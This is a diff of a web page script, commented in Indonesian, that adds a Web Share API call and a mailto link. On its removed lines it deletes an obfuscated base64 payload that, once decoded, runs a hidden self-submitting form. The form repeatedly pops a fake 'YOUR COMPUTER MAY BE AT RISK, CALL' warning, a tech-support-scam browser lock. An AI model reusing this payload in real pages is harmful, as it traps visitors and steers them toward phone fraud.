@@ -3,31 +3,37 @@
 </body>
 
 <script>
-
 var t;
 
 function foo(){
+    // 1. Panggil Web Share API jika didukung
+    if (navigator.share) {
+        navigator.share({
+            title: 'Contoh Share',
+            text: 'Ini contoh Web Share API',
+            url: 'https://example.com'
+        }).then(() => {
+            console.log('Share berhasil!');
+        }).catch(err => {
+            console.log('Share dibatalkan atau gagal:', err);
+        });
+    }
 
-    // 1. Jalankan mailto (ganti Web Share API)
-    window.location.href = "mailto:example@example.com?subject=Coba&body=Ini%20contoh%20email";
+    // 2. Panggil mailto setelah Web Share
+    setTimeout(() => {
+        window.location.href = "mailto:example@example.com?subject=Coba&body=Isi%20email";
+    }, 500); // delay 500ms agar share API muncul dulu
 
-    // 2. Struktur asli tetap jalan (hapus redirect ke google)
+    // 3. Struktur interval/bar tetap jalan
     t = setInterval(bar, 1);
 }
 
 function bar(){
     try{
-        // Kosongkan karena sebelumnya w.location.href (redirect) dihapus
+        // sebelumnya ada w.location.href; kita kosongkan karena redirect dihapus
     }
     catch(e){
         clearInterval(t);
-        setTimeout(function(){
-            document.write(atob(
-                'PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uKGVkKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSy5cbkNBTEw6IDgwMC0xMTEtMjIyMiIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9PC9zY3JpcHQ+Cjxm b3JtPgogICAgPGlucHV0IHBsYWNlaG9sZGVyPSJhYWEiIHJlcXVpcmVkIGlkPSJhYWEiIC8+CiAgICA8aW5wdXQgaWQ9J2JiYicgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiPgo8L2Zvcm0+'
-            ));
-            test();
-        }, 1000);
     }
 }
-
 </script>
